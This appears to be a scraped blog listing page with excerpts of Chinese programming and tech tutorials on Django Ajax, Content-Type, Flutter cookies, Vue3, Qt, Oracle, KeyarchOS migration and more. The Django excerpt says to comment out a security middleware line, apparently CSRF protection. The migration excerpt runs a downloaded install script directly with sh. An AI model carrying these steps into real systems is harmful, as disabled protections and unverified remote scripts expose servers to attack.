		文章目录 一、Ajax简介二、基于jquery实现Ajax三、使用Ajax注意的问题1.Ajax不要与form表单同时提交2.后端响应格式问题3、使用了Ajax作为请求后的注意事项 四、前后端数据传输的编码格式(content-Type)1.urlencoded2.formdata3.application/json 五、Ajax携带文件数据六、Ajax发送json格式数据 一、Ajax简介 AJAX（Asynchronous Javascript And XML）翻译成中文就是“异步Javascript和XML”。即使用Javascript语言与服务器进行异步交互也是用XML进行数据传输（当然，传输的数据不只是XML，目前更多的使用Json数据）。
（XML应用于Web开发的许多方面，常用于简化数据的存储和共享）
AJAX不是什么新的编程语言，而是一种使用现有标准的新方法 AJAX最大的优点就是不需要重新加载整个页面的情况下，可以与服务器交换数据并更新网页内容 （简单来说就是，在网页前端刚输入完数据，后端其实已经验证完数据了，不需要等点击提交了） AJAX不需要任何浏览器插件，但需要用户运行Javascript在浏览器上执行 1.AJAX使用Javascript技术向服务器发公司异步请求 2.AJAX请求无需刷新整个页面 3.因为服务器响应内容不再是整个页面，而是页面中的部分内容，所以AjAX性能高。 同步交互：客户端发出一个请求后，需要等待服务器响应结束后，才能发出第二个请求。
异步交互：客户端发出一个请求后，无需等待服务器响应结束，就可以发出第二个请求。
AJAX除了异步的特点外，还有一个就是：浏览器页面局部刷新；(这一特点给用户的感受是在不知不觉中完成请求和响应过程的)
常见的使用场景
注册用户时，会根据用户输入的命令关键字，自动提示改关键字是否通过检验
很多网站注册的时候都会使用到AJAX技术，当文本框发生了输入变化时，使用AJAX技术向服务器发送一个请求，然后服务器会把查询到的结果响应到的结果响应给浏览器，期间浏览器是不用刷新的，最后把后端返回的结果展示出来。
整个过程中页面没有刷新，只是刷新了页面中的局部位置当请求发出后，浏览器还可以进行其他操作，无需等待服务器的响应 二、基于jquery实现Ajax 目前Ajax一般不会使用原生Javascript来编写，因为需要考虑不同浏览器的兼容性。我们这里通过jquery来实现，更简单、不需要考虑不同浏览器引发的兼容问题。
过程：我们通过在前端向一个URL发送Ajax请求，来让后端处理这个请求后返回数据给Ajax接收。
这里用一个案例来代入：
通过Ajax，实现前端输入两个数字，服务器做加法，返回到前端页面
先在Django配置路由
from django.conf.urls import url from django.contrib import admin from app import views urlpatterns = [ url(r'^admin/', admin.site.urls), url(r'^index/', views.index), url(r'^sum/', views.sums), # ajax会向这个路由提交请求，执行sums视图函数 ] 注意：一定要在settings.py配置文件里面注释中间件的一行内容
这行代码的作用后续在讲解，目前先注释掉，不然请求会提交不成功！
views.py处理请求
from django.shortcuts import render,HttpResponse def index(request): # 返回一个index页面 return render(request,'index.html') def sums(request): # 处理ajax请求 num1 = int(request.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4bb796577aea6ec4d265515361c23e9b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e5ee58a183cf5dddfea0b4c002e6ef75/" rel="bookmark">
			太累了，是时候让AI数字人来帮我干活了（走，上教程）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 阿酷TONY，原创文章，长沙，2023.11.21
关 键 词：AI数字人，生成式AI，智能数字分身
适用场景：培训数字人，演讲授课数字人，直播带货数字人
特别说明：教程用的是国内保利威AI产品，内容为原创。
AI数字人主要的一些应用场景：客户服务和支持、教育和培训、医疗保健、娱乐和媒体、销售和营销。
造个数字人来帮我做授课教学，朗读一篇文章吧，好的，没问题，上教程。
目录
第一步：讲稿文章准备
第二步：做个PPT（绿底色）
第三步：数字人开工
第四步：PR工具合成
第五步：收工，上效果
第一步：讲稿文章准备 首先写篇文章，文章很简单，Siri，帮我生成一下文章：
当脚步踏上柔软的细沙，微风拂过海面，我仿佛置身于一片宁静的世界。这美丽的海滩，却让我思念着一个人——你。
海浪拍打着礁石，波光粼粼的海面闪烁着迷人的光芒。但在我眼中，这美景似乎都在诉说着你的故事。记得我们曾一起梦想着来到这样的海滩，手牵手漫步在沙滩上，享受着海风的拥抱。如今，这美丽的景色让我感到一份孤独，因为没有你陪伴在我身旁。
我闭上眼睛，试图在海风的呢喃声中感受到你的存在。在这悠长的海岸线上，回忆的画面涌上心头。每一片涟漪都勾勒出你温柔的笑容，每一片浪花都带来你的声音，仿佛你就在身边，陪伴着我享受这片海的宁静。
或许，这片海滩就是你留给我的一份思念。我抬头仰望着苍穹，想象着你如何在天空中的云朵间自由飞翔，如同这片海洋一样广阔无边。
在这美丽的海滩，我第一个想到的永远是你。无论身在何处，你的存在永远如此清晰，如潮水般涌向心间。或许，当太阳再次升起，当我再次来到这片海滩，我仍会将你牢牢地放在心底，因为你已经成为我生命中最美丽的风景。
第二步：做个PPT（绿底色） 这个很简单啦，平台可以将数字人与PPT合成带语音的视频，在这只要做绿底色的简易PPT即可（绿色的原因是类似于绿幕处理），上面第一步中的文章添加到PPT中，复制，粘贴，好了，PPT完成了。
第三步：数字人开工 这么多数字人，选哪个，好吧，选她吧。
PPT有了，数字人选好了，生成视频吧，马上生成。
叮，您的视频生成好了。 试听一下吧，嗯，这效果还不错嘛。
如果要求低一下，将绿色PPT，换成其他背景，这教学视频就完工了。
可是，作为有着高尚追求的偶，还想要做成精品课，所以，背景，换掉。好，上PR工具。
第四步：PR工具合成 第五步：收工，上效果 这是观看的最终视频效果页面：
来到美丽海滩想起了你https://share.plvideo.cn/front/video/view?vid=b54879732039724a05ab9d68b37aa1e8_b
说明：
第四步，实际是可以省去的。完成前三步，就可以生成数字人授课教学视频内容了。我这边主要是想加个背景，让画面与文章主题更贴近一些。
希望教程能给大家带来乐趣，如果有什么问题，可以联系我哈，AI数字人，蛮好玩的。
MR虚拟直播 MR直播实例(混合现实直播)高品质企业直播企业年会直播来个虚拟舞台场景如何？MR直播(混合现实直播)做一场高品质企业培训MR场景直播-帮助企业高效开展更有意思的员工培训企业多会场视频直播（主会场、分会场直播）实例效果虚拟直播（虚拟场景直播）要怎么做？ 无延迟直播 无延时直播/超低延时直播画面同步性测试（实测组图）搞定企业视频直播：硬件设备、直播网络环境和设备连接说明无延时/无延迟视频直播实例效果案例OBS无延迟视频直播完整教程（组图）毫秒级超低延时直播产品实测（PRTC直播/webRTC直播） 视频加密与安全 企业培训视频如何防止被下载和盗用？在线教育机构视频加密防下载和防盗用的方法有哪些可以借鉴上新：视频加密功能增加防录屏(随机水印)功能两种实现视频倍速播放的方法（视频播放器倍速1.5x/2x）教育培训机构教学课程内容视频加密是如何做的？ 在线导播台 在线导播台（网页导播台）混流效果OBS Studio导播台多画面使用实测软件导播台多画面切换支持多人连麦实测（实测组图） 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a3e8bf2adea094dcdcd10efc40fa8ef1/" rel="bookmark">
			Content-Type的类型详解/前后端对于不同Content-type数据类型的处理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Content-Type的类型详解 引言 在前端开发中，我们经常需要与后端进行数据交互。然而，在发送网络请求时，很多开发者可能会遇到一个共同的问题：如何正确地设置请求头中的Content-Type以及后端如何处理接收到的数据。与数据类型相关的请求/响应头主要是两个：Accept和Content-Type，其中Content-Type在请求头和响应头中都存在。我们从请求头的角度来介绍各个数据类型。
本博客将深入解析Content-Type的含义，介绍它们的分类和原因，并从前端和后端两个角度分别说明如何使用和处理。
Content-Type介绍 Content-Type作用 Content-Type头部是在客户端向服务器发送请求时，指定请求体的媒体类型。服务器据此判断请求体的格式，从而正确解析数据。
Content-Type 分类 Content-Type的分类是基于MIME类型的，MIME类型通常由两部分组成，一部分是媒体类型（media type），另一部分是子类型（subtype），用斜杠分隔。例如，text/html表示数据的大类是文本，子类是HTML。
MIME 类型有很多种，不同的应用场景可能会使用不同的 MIME 类型。
一般来说，常见的 MIME 类型有以下几类：
text：表示纯文本或者文本格式的数据，如 text/plain, text/html, text/css, text/xml 等。
image：表示图像或者图形格式的数据，如 image/jpeg, image/png, image/gif, image/svg+xml 等。
audio：表示音频或者声音格式的数据，如 audio/mpeg, audio/wav, audio/ogg 等。
video：表示视频或者动画格式的数据，如 video/mp4, video/webm, video/ogg 等。
application：表示其他类型的数据，通常是二进制格式或者特定应用程序的格式，如 application/pdf, application/zip, application/json, application/javascript 等。
multipart：表示多个部分组成的数据，每个部分可以有自己的 MIME 类型，如 multipart/form-data, multipart/mixed 等。
message：表示电子邮件或者其他消息格式的数据，如 message/rfc822, message/http 等。
几种经典的Content-type的介绍 application/x-www-form-urlencoded 这是一种用于发送表单数据的类型，它会将数据以键值对的形式编码，例如name=Tom&amp;age=18。键和值都会进行URL编码，以避免特殊字符的影响。
这种类型的优点是可以发送任何类型的字符，但缺点是不能发送二进制数据，如文件上传，而且URL编码会增加数据的长度，可能会超过服务器的限制。
表单发送 这是默认的表单编码类型，它会将表单中的数据经过URL编码后，用&amp;符号分隔，发送到服务器。
例如，如果表单中有两个字段，fname=张，lname=san，html内容为：
&lt;form action="http://localhost:3000/test" method="post" enctype="application/x-www-form-urlencoded" &gt; First name: &lt;input type="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a3e8bf2adea094dcdcd10efc40fa8ef1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/31ec176731334cfaf91d7ed1bd205eef/" rel="bookmark">
			Sentinel-2 哨兵二号数据（Level-1C）下载及预处理教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1 哨兵数据的下载
1.1 欧空局官网下载
1.2 USGS网址下载
2 哨兵处理软件下载—链接已更新
2.1 下载Sen2cor软件
2.2 下载SNAP软件
3 哨兵数据产品介绍
3.1 产品名称
3.2 产品级别
4 L1C数据处理为L2A数据过程
4.1 单文件处理
4.1.1 使用命令提示符，Win+R，输入cmd（命令提示符）
4.1.2 切换到Sen2cor所在位置，我的在F盘
4.1.3 处理命令，L2A_Process.bat+“下载的L1C的位置”
4.2 批量处理
5 哨兵影像的输出
5.1 波段选择输出
5.2 数据重采样输出
5.3 ENVI波段融合（Layer Stacking）
欧空局（ESA）仅发布了哨兵2号（S2）的L1C级多光谱数据（MSI），L1C级数据是经过几何精校正的正射影像，并没有进行辐射定标和大气校正。同时，ESA还对S2 L2A级数据进行了定义，L2A级数据主要包含经过辐射定标和大气校正的据（Bottom-of-Atmosphere corrected reflectance），但这个L2A数据需要用户根据需求自行生产，为此，ESA发布了专门生产L2A级数据的插件Sen2cor。
Sentinel-2 BandsCentral Wavelength(μm)Resolution(m)用途Band1 - Coastal aerosol0.44360海岸/气溶胶波段，用来监测近岸水体和大气中的气溶胶Band2 - Blue0.49010可见光波段
Band3 - Green0.56010Band4 - Red 0.66510Band5 - Vegetation Red Edge0.70520红光范围内波段对监测植被健康非常有效Band6 - Vegetation Red Edge 0.74020Band7 - Vegetation Red Edge 0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/31ec176731334cfaf91d7ed1bd205eef/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b4b452d4954703844c25e8e53aa93d33/" rel="bookmark">
			Flutter dio Http请求之Cookie管理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在应用开发过程中，我们进行Http通讯时会使用Cookie进行验证，今天我们就着重讲解Flutter 网络请求插件dio的cookie使用。
首先，我们要进行插件引用
# HTTP 请求 dio: ^5.1.1 cookie_jar: ^4.0.8 dio_cookie_manager: ^3.0.0 # 获取沙盒路径 path_provider: ^2.1.1 这里为什么要使用path_provider这个插件呢，下面在cookie的储存时会做介绍。
引用完，我们执行以下命令
pub get dio的使用网上有很多详细资料，这里就不做过多介绍，这里着重讲解一下Cookie的使用。
首先，我们创建一个Cookie管理类CookieHandle，具体实现方式和解释会在代码中进行详解。
代码如下：
import 'dart:io'; import 'package:cookie_jar/cookie_jar.dart'; import 'package:path_provider/path_provider.dart'; class CookieHandle { //改为使用 PersistCookieJar，在文档中有介绍，PersistCookieJar将 cookie保留在文件中，因此，如果应用程序退出，则cookie始终存在，除 非显式调用delete static PersistCookieJar? _cookieJar; /// cookie保存，url 为要储存cookie的某个url static Future&lt;void&gt; saveCookie(String url) async { Uri uri = Uri.parse(url); //获取cookies Future&lt;List&lt;Cookie&gt;&gt; cookies = (await CookieHandle.cookieJar).loadForRequest(uri); cookies.then((value) async { /// cookie的储存时存在沙盒路径下 (await CookieHandle.cookieJar).saveFromResponse(uri, value); }); } /// cookie获取 static Future&lt;PersistCookieJar&gt; get cookieJar async { if (_cookieJar == null) { Directory appDocDir = await getApplicationDocumentsDirectory(); _cookieJar = PersistCookieJar(storage: FileStorage(appDocDir.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b4b452d4954703844c25e8e53aa93d33/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0583f9e8153b36df40b21cd02123a0cd/" rel="bookmark">
			Vue3的升级及优化总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Vue3的升级及优化总结 版本要求Vue2到Vue3的变化Vue3新特性 未完待续 版本要求 node: 14.0版本以上
“vue-loader”: “^16.0.0”
“vue”: “^3.1.0”
“@vue/compat”: “^3.1.0”
“@vue/compiler-sfc”: “^3.1.0”
Vue2到Vue3的变化 1. Vue2是面对对象编程，Vue3是面向函数编程
2. 直接访问子组件的$children被遗弃，建议使用$refs。
3. Mixin行为改变：3.0为浅层合并
4. 生命周期钩子函数变更
2.0：beforeCreate, created, beforeMount, mounted, beforeUpdate, updated, beforeDestroy, destroyed
3.0：setup, onBeforeMount, onMounted, onBeforeUpdate, onUpdated, onBeforeUnmount, onUnmounted
5. 指令的生命周期
2.0: bind, inserted, update, componentUpdated, unbind
3.0: created, beforeMount, beforeUpdate, updated, beforeUnmount, unmounted
6. 双向绑定原理
2.0: 遍历data使用Object.defineProperties重新定义所有属性的get和set属性。在get时进行依赖收集，在set时进行发布更新。
3.0: 使用 new Proxy(instance.stx, publicInstanceProxyHandlers)返回一个代理对象，在handler里定义了代理对象了get, set, has和defineProperty
7. Vue3支持多个根节点
Vue2的template模板里只允许一个根节点，Vue3可以多个
8. diff算法
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0583f9e8153b36df40b21cd02123a0cd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2ec06c9eb577f6c42345d3a4defd2f71/" rel="bookmark">
			【Qt一坑】qt编译出现“常量中有换行符”
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 在qt编译过程中出现“常量中有换行符”，原因有以下几点（qt版本5.14.2）：
1.中文编码格式问题，将UTF-8编码格式改成 UTF-8 BOM。
或者使用QtCreator 进行如下设置（找到Qt的左边列表里的项目，下的Manage Kits,下的文本编辑器，下的Behavior，将箭头所指位置分别改成“UTF-8”，以及“如果编码是UTF-8则添加”，点击确定）：
这样再去编译的时候，一定不会再报错了，但是你会发现一个新的问题，就是编译出来的程序中文是乱码！
解决这个问题也很简单，在你输入中文的地方，用 QStringLiteral 宏包裹一下就可以了，代码如下：
void MainWindow::on_showMessage_clicked() { QMessageBox::information(nullptr, QStringLiteral("提示"), QStringLiteral("这是一个中文的提示，来测试是否有错误。")); } 这样再编译出来的程序就不会乱码了。
2.依旧采用默认编码，在需要使用中文的地方使用QStringLiteral("text")来进行转码
3.编译方式问题，如果qt采用的MSVC编译，代码文件是无BOM的utf-8编码格式,可以切换为GW编
译，或者在pro文件里加入以下代码:
msvc { QMAKE_CFLAGS += /utf-8 QMAKE_CXXFLAGS += /utf-8 } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9e6b5770e1499d4dbc2529b213a45987/" rel="bookmark">
			无法启动 Microsoft Outlook。无法打开 Outlook 窗口。无法打开此文件夹集合：解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 打开「运行」窗口，输入以下命令初始化 Outlook 客户端
第一种方法：
注意：该操作将清除原有的 Outlook 配置文件信息
1、找到 outlook 安装目录，本例是安装的 Office365
C:\Users\Administrator&gt;cd C:\Program Files\Microsoft Office\root\Office16\ 2、初始化
outlook /importprf .\.prf 第二种方法：
1、打开控制面板，找到 Mail
2、打开 显示配置文件
3、添加一个 Profile
4、输入配置名称和邮箱密码，点下一步
5、选择配置文件
6、重新打开 Outlook时，就会以这个新的配置文件加载 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e9fb79d23b9d91a20292c6254c588b05/" rel="bookmark">
			oracle创建只读用户账号
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		–创建用户
create user hapreader identified by hapreader default tablespace hap_data;
–赋予连接权限
grant connect to hapreader;
–给表权限
SELECT ‘GRANT SELECT ON hap.’ || T.TABLE_NAME || ’ TO hapreader;’
FROM user_tables t
–给只读账户赋创建同义词权限
grant create synonym to hapreader;
–创建同义词语句，切换只读账户执行
SELECT ‘create or replace SYNONYM hapreader.’ || T.TABLE_NAME ||
’ FOR hap.’ || T.TABLE_NAME || ‘;’
from user_tables t
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c101b746494a83c4bd6ee0bc250b2397/" rel="bookmark">
			Mac- Iterm 2 (替换mac terminal 终端的下一代终端工具)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.应用场景
主要用于macOS中作为终端工具使用, 执行终端命令, Iterm 2 (替换mac terminal 终端的下一代终端工具) 2.学习/操作
1.文档阅读 chatgpt
&amp; 其他资料
2.整理输出 2.1 是什么 Iterm 2 (替换mac terminal 终端的下一代终端工具)
2.2 为什么需要「应用场景」 macOS中, 结合使用终端命令, 能够有效提升工作效率,
然而mac自带终端terminal有些功能并不具备,
Iterm 2 功能更加强大, 有一些很好用的特性, 也即替换mac terminal 终端的下一代终端工具
2.3 什么时候出现「历史发展」 iTerm2 - macOS Terminal Replacement
2.4 怎么实践(功能介绍) 1, 支持垂直水平分窗 后续补充
...
3.问题/补充
TBD
后续补充
...
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4d38fd4df6efd2dc78dc97bfc2a66339/" rel="bookmark">
			X2Keyarch迁移工具实战 | 将CentOS高效迁移至浪潮云峦操作系统KeyarchOS
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		X2Keyarch迁移工具实战 | 将CentOS高效迁移至浪潮云峦操作系统KeyarchOS 1. 搭建仿真线上业务环境2. 安装KeyarchOS操作系统和X2Keyarch迁移工具3. 将CentOS系统业务迁移至KeyarchOS系统 浪潮信息云峦操作系统KeyarchOS基于Linux Kernel、OpenAnolis等开源技术自主研发的一款服务器操作系统，支持x86、ARM等主流架构处理器，具备成熟的 CentOS 迁移和替换能力，可满足云计算、大数据、分布式存储、人工智能、边缘计算等应用场景需求。
KeyarchOS迁移方案同步推出可视化迁移工具X2Keyarch，该工具具备迁移风险评估，硬件兼容性评估、应用评估、系统配置评估等功能，其原地升级技术将存量CentOS系统批量升级至KeyarchOS操作系统，升级后系统参数无需重新配置，大大提高了迁移效率，降低了客户的迁移成本。
1. 搭建仿真线上业务环境 基于CentOS操作系统并使用宝塔面板搭建一个LNMP仿真线上业务环境
宝塔官网地址
# yum install -y wget &amp;&amp; wget -O install.sh https://download.bt.cn/install/install_6.0.sh &amp;&amp; sh install.sh ed8484bec +---------------------------------------------------------------------- | Bt-WebPanel FOR CentOS/Ubuntu/Debian +---------------------------------------------------------------------- | Copyright © 2015-2099 BT-SOFT(http://www.bt.cn) All rights reserved. +---------------------------------------------------------------------- | The WebPanel URL will be http://SERVER_IP:8888 when installed. +---------------------------------------------------------------------- | 为了您的正常使用，请确保使用全新或纯净的系统安装宝塔面板，不支持已部署项目/环境的系统安装 +---------------------------------------------------------------------- Do you want to install Bt-Panel to the /www directory now?(y/n): y .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4d38fd4df6efd2dc78dc97bfc2a66339/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/99ac748321be5fea0ecd32f4bd233a50/" rel="bookmark">
			什么是一阶逻辑？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一阶逻辑（FOL）是指句子或陈述的谓词只能指单个主语Subject的逻辑。
一阶逻辑也称为谓词逻辑或一阶谓词逻辑，它不但能以更简便的方式表达对象信息，还能表达这些对象之间的关系。
一阶逻辑（像自然语言一样）组成：
对象：人、数字等各种对象关系：它可以是一元关系，如：红色、圆形、相邻；也可以是n元关系，如：的妹妹、的弟弟、有颜色、介于两者之间。函数Function：父亲的、最好朋友的、第三局的、结束的、...... 从符号角度：一阶逻辑FOL 由三组符号组成：
V：一组变量。F：一组函数，也称为函子。P：谓词的集合，也称为关系、符号。 上述是两种分类法，前者更接近语文；后者更接近数学。所以，不只是语文、数学学得好，还要两者结合思考，死读书考试让学生没有时间去驾驭语文和数学进行综合思考，逻辑能力非常差，创新力差。
作为一种自然语言，一阶逻辑也有两个主要部分：
语法语义 1、语法：
常量Constant：1, 2, A, John, Mumbai, cat,....变量Variables：x, y, z, a, b,....谓词Predicates：Brother, Father, &gt;,....函数Function：sqrt, LeftLegOf, ....连接词Connectives：∧, ∨, ¬, ⇒, ⇔等号Equality：==量词Quantifier：∀, ∃ 原子句：
原子句是一阶逻辑最基本的句子。这些句子由谓词符号后跟带有一系列术语的括号组成。
表示为谓词Predicate (term1, term2, ......, term n)。
示例：
Ravi 和 Ajay 是兄弟： =&gt; Brothers(Ravi, Ajay)。
Chinky 是一只猫： =&gt; 猫 (Chinky)。
banq注：第一句是组合，第二句是继承：抽象两种方法：上下文与﻿类型
复杂句子：
复杂句子是通过使用连接词组合原子句子而构成的。 一阶逻辑语句可以分为两部分：
主题：主题是陈述的主要部分。
谓词：谓词可以定义为一种关系，它将两个原子在一个语句中绑定在一起。
“x 是一个整数。”由两部分组成：
第一部分 x 是陈述的主语subject，第二部分“是一个整数”，被称为谓词Predicates。 一阶逻辑中的量词：
量词是产生量词的语言元素，量词指定了语域中样本的数量。这些符号允许确定或标识逻辑表达式中变量的范围和范围。量词有两种类型： 通用量词，（对于所有人，所有人，一切） 存在量词（对于某些人来说，至少有一个）。 FOL 与命题逻辑 ( PL )不同
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/99ac748321be5fea0ecd32f4bd233a50/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/50e5cae6e48a5fd18deb836caf03f7ec/" rel="bookmark">
			文生图一致性角色生成！谷歌最新文本到图片扩散模型工作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		大家好，我是阿潘，今天和大家分享一篇谷歌最新的文生图的工作。主要解决在文生图中无法生成一致性角色的难题！如果有帮助，欢迎大家帮忙转发分享，感谢！
推荐 微信交流群现已有2000+从业人员交流群，欢迎进群交流学习，微信：nvshenj125
B站最新成果demo分享地址：https://space.bilibili.com/288489574
顶会工作整理Github repo：https://github.com/DWCTOD/CVPR2023-Papers-with-Code-Demo
The Chosen One: Consistent Characters in Text-to-Image Diffusion Models 论文：https://arxiv.org/pdf/2311.10093.pdf
项目：https://omriavrahami.com/the-chosen-one/
摘要: 文本到图像生成模型的最新进展释放了视觉创造力的巨大潜力。然而，这些模型在生成一致的角色方面遇到了困难，而这对于故事可视化、游戏开发资产设计、广告等众多现实应用程序来说是一个至关重要的方面。当前的方法通常依赖于目标角色的多个预先存在的图像或涉及劳动密集型的手动过程。在这项工作中，我们提出了一种用于一致角色生成的全自动解决方案，唯一的输入是文本提示。我们引入了一个迭代过程，在每个阶段，识别一组具有相似身份的连贯图像，并从该组中提取更一致的身份。我们的定量分析表明，与基线方法相比，我们的方法在即时对齐和身份一致性之间取得了更好的平衡，并且这些发现得到了用户研究的证实。
例如，考虑一位插画师正在创作橡皮泥猫角色。如图 2 所示，SOTA的文本到图像模型根据描述角色的prompt，会产生各种结果，很可能缺乏一致性（第一行）。相比之下，在这项工作中，展示了如何提取一致的猫表征（第二行），然后可以使用它在多种不同的上下文中描绘同一角色。
在这项工作中，认为在许多应用中，目标是生成一些一致的角色，而不是在视觉上匹配特定的外观。因此，作者提出了一种新的设置，目标是自动提取仅需要符合单一自然语言描述的角色的一致表示。我们的方法不需要目标角色的任何图像作为输入；因此，它能够创建一个新颖的一致角色，不一定类似于任何现有的视觉描绘。
一致角色生成任务是基于以下假设：对于特定提示，足够大的生成图像集将包含具有共享特征的图像组。给定这样一个集群，我们可以提取一种表示，捕获其图像之间的“共同点”。使用这种表示重复该过程，我们可以增加生成图像之间的一致性，同时仍然忠实于原始输入提示。 1、首先根据提供的文本提示生成图像库，并使用预先训练的特征提取器将它们embedding到欧几里得空间中。
2、接下来，对这些mbedding进行聚类，并选择最具”凝聚力“的簇作为尝试提取一致身份的个性化方法的输入。
3、然后，我们使用生成的模型生成下一个图像库，该图像应该表现出更高的一致性，同时仍然描述输入提示。迭代重复该过程直至收敛。
主要贡献是：（1）我们形式化了一致角色生成的任务，（2）为该任务提出了一种新颖的解决方案，（3）除了用户研究之外，我们还定量和定性地评估我们的方法，以 证明其有效性。
详细方案 如前所述，这项工作的目标是基于文本描述生成一致的角色图像（或另一种视觉主题）。通过迭代定制预训练的文本到图像模型来实现这一目标，使用模型本身生成的图像集作为训练数据。直观上，我们通过反复将模型的输出汇集到一致的身份来细化目标角色的表示。一旦该过程收敛，所得模型就可以用于在新颖的上下文中生成目标角色的一致图像。
具体方法如算法1和图3所示，以下是每一步的细节：
3.1. Identity Clustering
使用特征提取器 F 将每个图像嵌入到高维语义embedding空间中，这里使用 DINOv2 作为特征提取器 F。
接下来使用 K-MEANS++ 算法根据embedding空间中的余弦相似度对生成图像的embedding进行聚类。然后使用预设的阈值来过滤掉簇的大小过小的情况，并在剩余的集群中，选择最具“凝聚力”的簇作为身份提取阶段的输入。
在图 4 中，我们展示了 DINOv2 嵌入空间的可视化，其中高维嵌入 S 使用 t-SNE 投影到 2D 中，并根据其 K-MEANS++ 集群进行着色。一些嵌入比其他嵌入更紧密地聚集在一起，并且选择黑色集群作为最具“凝聚力”的簇。
3.2. Identity Extraction
根据当前迭代中生成的图像集的多样性，最具内聚性的聚类内聚性可能仍然表现出不一致的身份，如图 3 所示。因此，表征 θ 尚未准备好进行一致生成，我们进一步细化 它通过对图像进行内聚训练来提取更一致的身份。这种细化是使用文本到图像个性化方法进行的，其目的是从给定的一组已经描述了一致身份的图像中提取角色。虽然我们将它们应用于一组不完全一致的图像，但这些图像是根据彼此的语义相似性来选择的，使得这些方法能够从中提取出共同的身份
作者的解决方案基于预训练的稳定扩散 XL (SDXL) 模型，该模型使用两个文本编码器：CLIP 和 OpenCLIP 。执行 textual inversion 以添加一对新的文本标记 τ ，每个文本标记对应两个文本编码器。然而，作者发现这个参数空间的表达能力不够，因此还通过自注意力层和交叉注意力层的低秩适应（LoRA）来更新模型权重。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/50e5cae6e48a5fd18deb836caf03f7ec/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4e0a33911d7825d099bd505e75acefa7/" rel="bookmark">
			STM32:OLED屏幕开发
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、OLED原理 所谓的屏幕就是由一个个小灯组成，每个小灯称之为一个像素。只要在屏幕上有选择地点亮一部分小灯，就可以显示我们想要的图案。所谓下分辨率就是屏幕上的小灯数量。常见单片机中常见的屏幕分辨率常见的就是128(列长)*64(行高)。如果每个小灯都由单片机直接相连控制，那么需要8000多个引脚才能满足需求，着显然是不切实际的。因此需要借助“屏幕驱动芯片”来控制OLED。我们只需要通过IIC或者SPI等通信协议与屏幕驱动芯片进行通信，就可以操控屏幕上着8000多个小灯的亮灭了。
对于CH1116屏幕驱动芯片，就可以驱动128*64分辨率的屏幕。这类芯片将整个屏幕分成8个页。每页为是128*8.因此每页的行数就成了8行，每一列上有8个数据刚好可以用8个字节0/1表示。CH1116的IIC设备地址为0x7A。
CH1116的关键操作为设置页地址和列地址
指令说明启动IIC通信 0x7A 0x00为OLED的外设地址，指令要以0x00开头设置第0页的页地址0xB0设置第7页的页地址0xB7设置列地址0x5A(低4位)0x0A设置列地址要分为两次，0xYZ设置地址时，要设置0x0Z 和0x1Y。因此设置第90列的像素列，即0x5A需要列0x0A(低4位),0X15(高4位).设置列地址0x5A(高4位)0X15设置数据,即像素亮灭 0x40 发送0x40 0x00 &lt;当前列数据bitmap 下一数据bitmap ....&gt;
。例如确定第0页和列地址为0x5A后，发送:
0x40 0x01 0x03 ;那么屏幕上的第90列的第一个像素点和第91列的前两个像素点就会亮。
CH1116有一个非常方便的特性，就是在设置数据时，当前页和列的数据被设置好后，列地址会自动加1.例如，确定好第0页和第0列后，一股脑发送0x40 0xFF 0xFF .....0xFF(128个0xFF)，那么OLED屏幕的前8行就全部被点亮了。
二、准备工作 新建工程，设置IIC1 的模式，由于要操作的数据要求更新要快，因此要把IIC的速度模式设置成快速模式。此时IIC的时钟频率也变到了400000。一般没做其他操作情况下，STM32的内部时钟一直都采用8M速度运行。
